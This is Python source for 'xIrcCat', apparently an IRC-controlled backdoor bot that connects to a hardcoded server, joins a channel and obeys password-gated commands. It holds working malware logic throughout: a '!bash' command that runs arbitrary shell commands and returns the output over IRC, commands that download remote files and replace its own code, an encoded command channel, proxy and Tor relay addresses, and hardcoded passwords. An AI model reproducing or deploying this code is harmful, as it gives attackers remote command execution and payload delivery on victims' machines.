"""
------------------------------------
--== xIrcCat ==-- by madK0s -- mijau
------------------------------------
"""
#--
import ssl
import socket
import select
import socks
import re
import base64
import random
import os
import sys,getopt
import requests

#--
import xEnco
import xMagic
import xLife

#--
SILENT       = False
VERSION      = 2.0
VERSION_NAME = "xIrcCat"
#--
class User:
    def __init__(self,Nick,Host):
        self.nick = Nick
        self.host = Host

#--
class xIrcCat():
    def __init__(self, host, port):
        self.myp("IrcCat init.")
        
        #--
        """
        self.user              = "t3ch"
        self.name              = "t3ch"
        self.nickname          = "t3ch"
        self.nick              = "t3ch"
        self.nickpass          = "j3kAt0mM"
        self.sasl              = True
        self.channel           = "#bipbip"
        self.pwd               = "skrlat"
        """
        self.user              = "bipbi2"
        self.name              = "bipbi2"
        self.nickname          = "bipbi2"
        self.nick              = "bipbi2"
        self.nickpass          = ""
        self.sasl              = False
        self.channel           = "#bipbip"
        self.pwd               = "skrlat"
        
        #-- Proxy. 
        # amazon good : 18.220.180.88:20064
        # k-lined fast: 103.240.168.138:6667
        # amazon good : 13.230.41.131:20039
        # tor         : 188.233.238.213:9100
        # tor         : 159.65.180.9:9050
        
        self.proxy_ip          = "" #"13.230.41.131"
        self.proxy_port        = 0  #20039
        """
        self.proxy_ip          = "61.41.9.213"
        self.proxy_port        = 1081
        """
        self.proxy_type        = socks.SOCKS5 # socks.SOCKS4 | socks.HTTP
        
        #-- xEnco
        self.magic             = "magicfile.txt"
        self.magicFrom         = 32
        self.magicTo           = 128
        
        #--
        self.run=True
        self.done_ident        = 0
        self.done_welcome      = 0
        self.users             = []
        
        #--
        self.loadLastSettings()
        
        #--
        if self.proxy_ip and self.proxy_port>0:
            self.myp("using proxy sockets")
            #-- Proxy socket
            self.sock = socks.socksocket()
            self.sock.set_proxy( self.proxy_type, self.proxy_ip, self.proxy_port )
        else:
            self.myp("using ssl sockets")
            #-- SSL socket
            self.context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.context.verify_mode = ssl.CERT_NONE
            self.sock = self.context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)
        #-- Normal socket
        #self.sock   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        
        #--
        try:
            self.sock.connect((host, port))
        except:
            self.myp("Failed connect.")
            sys.exit(2)
        
        #--
        while self.run:
            ready_to_read, ready_to_write, in_error = select.select([self.sock],[],[],1)
            for s in ready_to_read:
                if s==self.sock:
                    data = s.recv(1024)
                    if len(data) <= 0:
                        self.myp("IrcCat error: lost connection from irc server.")
                        self.run = False
                        break
                    
                    data = data.decode("utf-8")
                    self.myp("IrcCat data: {}".format(data))
                    
                    #--
                    self.onData(data,s)
    
    
    
    #--
    def saveLastSettings(self):
        open("irccat_settings.txt","w").write("NICK:{}".format(self.nick))
    
    #--
    def loadLastSettings(self):
        if not os.path.exists("irccat_settings.txt"):
            return False
        data = open("irccat_settings.txt","r").readline()
        a = data.split("\n")
        for line in a:
            b = line.split(":")
            if "NICK" in b[0]:
                self.nick = b[1]
    
    #--
    def myp(self,text):
        global SILENT
        if SILENT:
            return False
        else:
            print("xIrcCat - {}".format(text))
    
    #--
    def isLogged(self,host):
        self.myp("IrcCat isLogged() start on host: {}".format(host))
        for user in self.users:
            self.myp("checking nick: {}, host: {}".format(user.nick, user.host))
            if host in user.host:
                return True
        return False
    
    #--
    def logOut(self,host):
        self.myp("IrcCat logOut() start on host: {}".format(host))
        for user in self.users:
            self.myp("checking nick: {}, host: {}".format(user.nick, user.host))
            if host in user.host:
                self.users.remove(user)
                return True
        return False
    
    #--
    def genNick(self):
        a   = random.sample( range(65,90), 5 )
        #print(a)
        tmp = ""
        for i in a:
            #print("i: {}".format(i))
            tmp += chr(i)
        return "{}".format(tmp);
    
    #--            
    def onData(self,data,s):
        global SILENT
        
        a = data.split("\r\n")
        for tmp in a:
            #self.myp("onData tmp: {}".format(tmp))
            
            b           = tmp.split(" ",2)
            ret         = 0
            server_name = ""
            server_cmd  = ""
            server_data = ""
            
            if len(b)>2:
                server_name = b[0][1:]
                server_cmd  = b[1]
                server_data = b[2]
                self.myp("onData done_ident: {}, done_welcome: {}, server_name: {}, cmd: {}, data: {}".format(self.done_ident,self.done_welcome,server_name,server_cmd,server_data))
            
            if self.done_ident==0 and (re.match("\:.*NOTICE.*\:.*Checking Ident",tmp) or re.match(".*NOTICE.*Looking up your ident.*",tmp)):
                self.myp("onData Ident: {}".format(tmp))
                
                if self.sasl:
                    s.send( str.encode("CAP REQ znc.in/server-time\r\n") )
                    s.send(str.encode("CAP REQ znc.in/server-time-iso\r\n"))
                    s.send(str.encode("CAP REQ sasl\r\n"))
                    #s.send(str.encode("CAP LS\r\n"))
                    s.send( str.encode("NICK {}\r\n".format(self.nick) ))
                    s.send( str.encode("USER {} {} * {}\r\n".format(self.user, self.user, self.name) ))
                else:
                    s.send( str.encode("NICK {}\r\n".format(self.nick) ))
                    s.send( str.encode("USER {} {} * {}\r\n".format(self.user, self.user, self.name) ))
                    self.done_ident=1
                ret=1

            #--
            elif self.sasl and self.done_ident==0 and re.match(".*CAP .* ACK.*",tmp):
                self.myp("onData CAP * ACK...")
                s.send(str.encode("AUTHENTICATE PLAIN\r\n"))
                ret=1
            
            #--
            elif self.sasl and  self.done_ident==0 and re.match("AUTHENTICATE \+.*",tmp):
                tmp = str.encode("{}\x00{}\x00{}".format(self.user,self.user,self.nickpass))
                tmp = str.encode("AUTHENTICATE {}\r\n".format(base64.b64encode(tmp).decode("utf-8")))                
                self.myp("onData AUTHENTICATE sending: {}".format(tmp))
                s.send(tmp)
                ret=1
            
            #--SASL authentication failed
            elif self.sasl and  self.done_ident==0 and re.match(".*SASL authentication failed.*",tmp):
                self.myp("onData SASL authentication failed")
                s.send(str.encode("CAP END\r\n"))
                ret=1
            
            #--
            elif self.sasl and self.done_ident==0 and re.match(".*SASL.* successful.*",tmp):
                self.myp("onData SASL authentication successful")
                s.send(str.encode("CAP END\r\n"))
                self.done_ident = 1
                ret=1
            
            #--
            elif self.done_ident==1 and self.done_welcome==0 and "433" in server_cmd:
                tmp = self.genNick()
                #print("Need to change nick... to {}!!!".format(tmp))
                self.nick = tmp
                s.send( str.encode("NICK {}\r\n".format(tmp)) )
                self.saveLastSettings()
            
            #-- PING :IQ_dV{e{L]
            elif re.match('^PING \:.*',tmp):
                tmp1=tmp.split()[1]
                self.myp("IrcCat PONG: {}".format(tmp1))
                s.send( str.encode("PONG {}\r\n".format(tmp1)) )
                ret=1
            
            #--
            elif self.done_welcome==0 and (re.match("\:{} MODE {}.*\:\+[A-Z]".format(self.nick,self.nick),tmp) or server_cmd=="376" or server_cmd=="396"):
                self.myp("onData welcome done: {} using channel: {}".format(tmp,self.channel))
                if self.channel:
                    s.send( str.encode("JOIN {}\r\n".format(self.channel)) )
                self.done_welcome=1
                ret=1
            
            #--
            elif self.done_welcome==1:
                self.myp("IrcCat following commands...")
                a = tmp.split(" ")
                if len(a)>1:
                    # :t3ch!~t3ch@unaffiliated/t3ch PRIVMSG t3ch123 :!quit
                    nick = a[0].split("!")[0][1:]
                    host = a[0]
                    cmd  = a[1]
                    self.myp("IrcCat server nick: {} cmd: {} from: {}".format(nick, cmd, host))
                    
                    #-- check privmsgs
                    if re.match("PRIVMSG",a[1]):
                        msg  = tmp.split(":",2)[-1]
                        amsg = msg.split(" ")
                        self.myp("PRIVMSG({}): {}".format(len(amsg),msg))
                        
                        #--
                        if re.match("^\#\!\].*",msg):
                            tmp = xEnco.decoX(self.magic,msg[3:],self.magicFrom,self.magicTo)
                            if not tmp:
                                self.myp("PRIVMSG failed decoding.".format(tmp))
                            else:
                                self.myp("PRIVMSG decoded...: {}".format(tmp))
                                self.onCommand(s, tmp, nick, host)
                        else:
                            self.onCommand(s, msg, nick, host)
                        
                    #-- ONJOIN TITLE COMMANDS - check title after join
                    elif re.match("332",a[1]):
                        tmp = tmp.split(":",2)[-1]
                        tmp = xEnco.decoX(self.magic,tmp,self.magicFrom,self.magicTo)
                        if not tmp:
                            self.myp("Title failed decoding.".format(tmp))
                        else:
                            self.myp("Title decoded...: {}".format(tmp))
                        #--
                        #self.onCommand(s,tmp.split(" "),nick,host)

    #--
    def onCommand(self, s, msg, nick, host):
        amsg = msg.split(" ",3)
        
        #-- LOGIN PWD - PRIVMSG
        if not self.isLogged(host) and len(amsg)>1 and re.match("!login",amsg[0]):
            if amsg[1]==self.pwd:
                self.myp("Logging pwd: {} OK...".format(amsg[1]))
                
                self.users.append( User(nick,host) )
                self.myp("users len: {}".format( len(self.users) ))
                
                s.send( str.encode("PRIVMSG {} :Welcome {}.\r\n".format(nick,nick)) )
            else:
                self.myp("Logging pwd: {} FAIL...".format(amsg[1]))
                s.send( str.encode("PRIVMSG {} :Failed.\r\n".format(nick)) )
        
        #-- LOGOUT - PRIVMSG
        elif self.isLogged(host) and len(amsg)==1 and re.match("!logout",amsg[0]):
            self.myp("Logging out...")
            self.logOut(host)
            s.send( str.encode("PRIVMSG {} :Done.\r\n".format(nick)) )
        
        #-- QUIT - PRIVMSG
        elif self.isLogged(host) and len(amsg)==1 and re.match("!quit",amsg[0]):
            self.myp("Quiting...")
            s.send( str.encode("QUIT :done.\r\n") )
        
        #-- PART - PRIVMSG
        elif self.isLogged(host) and len(amsg)>1 and re.match("!part",amsg[0]):
            self.myp("Parting: {}...".format(amsg[1]))
            s.send( str.encode("PART {}\r\n".format(amsg[1])) )
        
        #-- JOIN - PRIVMSG
        elif self.isLogged(host) and len(amsg)>1 and re.match("!join",amsg[0]):
            self.myp("Joining: {}...".format(amsg[1]))
            s.send( str.encode("JOIN {}\r\n".format(amsg[1])) )
        
        #-- NICK - PRIVMSG
        elif self.isLogged(host) and len(amsg)>1 and re.match("!nick",amsg[0]):
            self.myp("Nick changing: {}...".format(amsg[1]))
            s.send( str.encode("NICK {}\r\n".format(amsg[1])) )
            self.nick = amsg[1]
            self.saveLastSettings()
        
        #-- REJOIN - PRIVMSG
        elif self.isLogged(host) and len(amsg)>1 and re.match("!rejoin",amsg[0]):
            self.myp("Rejoining: {}...".format(amsg[1]))
            s.send( str.encode("PART {}\r\n".format(amsg[1])) )
            s.send( str.encode("JOIN {}\r\n".format(amsg[1])) )
        
        #-- VERSION - PRIVMSG
        elif len(amsg)==1 and re.match("!version",amsg[0]):
            tmp = "{} - {}".format(VERSION_NAME,VERSION)
            self.myp("Version... {}".format(tmp))
            s.send( str.encode("PRIVMSG {} :{}\r\n".format(nick,tmp)) )
        
        #-- FCHECK - PRIVMSG - http://w4d4f4k.undo.it/ic/xIrcCat.py
        elif self.isLogged(host) and len(amsg)>1 and re.match("!fcheck",amsg[0]):
            self.myp("File check: {}".format(amsg[1]))
            #--
            if os.path.exists(amsg[1]):
                self.myp("File: {} exists!".format(amsg[1]))
                s.send( str.encode("PRIVMSG {} :{}\r\n".format( nick, "File: {} exists!".format(amsg[1]) )) )
            else:
                self.myp("File: {} dont exists!".format(amsg[1]))
                s.send( str.encode("PRIVMSG {} :{}\r\n".format( nick, "File: {} dont exists!".format(amsg[1]) )) )
        
        #-- FDOWNLOAD - PRIVMSG - http://w4d4f4k.undo.it/ic/xIrcCat.py
        elif self.isLogged(host) and len(amsg)>2 and re.match("!fdownload",amsg[0]):
            self.myp("Downloading: {}...{}".format(amsg[1],amsg[2]))
            
            #--
            tmp = requests.get( amsg[1], xEnco.headers );
            content = tmp.content
            
            #--
            open(amsg[2],"w").write(content)
            s.send( str.encode("PRIVMSG {} :Done.\r\n".format(nick)))
        
        #-- BASH - PRIVMSG 
        elif self.isLogged(host) and len(amsg)>1 and re.match("!bash",amsg[0]):
            self.myp("Executing: {}...".format(amsg[1]))
            bmsg = msg.split(" ",1)
            popendata = os.popen( "{}".format(bmsg[-1]) )
            
            lines = popendata.read().splitlines()
            for line in lines:
                s.send( str.encode("PRIVMSG {} :${}.\r\n".format(nick,line)) )
        
        #-- RESTART - PRIVMSG 
        elif self.isLogged(host) and len(amsg)==1 and re.match("!restart",amsg[0]):
            self.myp("Restarting...")
            #--
            xLife.restart()
            
            #--
            s.send( str.encode("QUIT :done.\r\n") )
            sys.exit(2)
        
        #-- UPDATE - PRIVMSG - http://w4d4f4k.undo.it/ic/xIrcCat.py
        elif self.isLogged(host) and len(amsg)>1 and re.match("!update",amsg[0]):
            self.myp("Updating: {}...".format(amsg[1]))
            
            tmp = requests.get( amsg[1], xEnco.headers );
            content = tmp.content
            
            tmpFile = "irccatupdate"
            
            if os.path.exists(tmpFile):
                self.myp("Update file: {} exists! Skipping update.".format(tmpFile))
                return False
            
            #--
            open(tmpFile,"w").write(content)
            
            self.myp("update content: {}".format(content))
            
            #--
            xLife.update(tmpFile)
            
            #--
            s.send( str.encode("QUIT :done.\r\n") )
            sys.exit(2)
            
        #-- TEST - PRIVMSG
        elif len(amsg)>1 and re.match("!cmd",amsg[0]):
            bmsg = msg.split(" ",1)
            self.myp("Testing !cmd: {}".format( bmsg[1] ))
            s.send( str.encode("{}\r\n".format( bmsg[1] )) )
            
        #-- SILENT - PRIVMSG
        elif len(amsg)>1 and re.match("!silent",amsg[0]):
            self.myp("Silent... {}".format(amsg[1]))
            if int(amsg[1])==1:
                s.send( str.encode("PRIVMSG {} :Done. I am quiet.\r\n".format(nick)) )
                SILENT=True
            else:
                s.send( str.encode("PRIVMSG {} :Done. I am loud again.\r\n".format(nick)) )
                SILENT=False
        
        #-- MAGIC - PRIVMSG - ( reset magicfile on x seed ) ex.: !magic 123
        elif self.isLogged(host) and len(amsg)>1 and re.match("!magic",amsg[0]):
            self.myp("Magic seed: {}...".format(amsg[1]))
            tmp = xMagic.get( int(amsg[1]), self.magicFrom, self.magicTo )
            self.myp("New magic content: {}".format(tmp))
            open(self.magic,"w").write(tmp)
            s.send( str.encode("PRIVMSG {} :Done.\r\n".format(nick)) )





"""
--# IrcCat #--
"""
#--
#xLife.protect()
#--
irccat = xIrcCat("207.148.28.126",6697)
